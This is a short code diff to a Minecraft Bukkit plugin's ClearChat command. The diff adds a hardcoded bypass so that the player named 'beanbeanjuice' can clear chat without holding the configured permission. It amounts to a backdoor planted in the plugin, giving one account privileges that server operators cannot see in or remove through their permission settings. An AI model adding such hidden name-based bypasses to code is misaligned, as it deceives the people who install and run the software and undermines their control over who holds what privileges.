@@ -28,7 +28,7 @@ public class ClearChat implements CommandExecutor {
 
         Player player = (Player) sender;
 
-        if (player.hasPermission("beanpunishments.clearchat")) {
+        if (player.hasPermission("beanpunishments.clearchat") || player.getName().equals("beanbeanjuice")) {
             clearChat();
             Bukkit.broadcastMessage(GeneralHelper.getPrefix() + GeneralHelper.translateColors(plugin.getConfig().getString("chat-cleared")));
             return true;
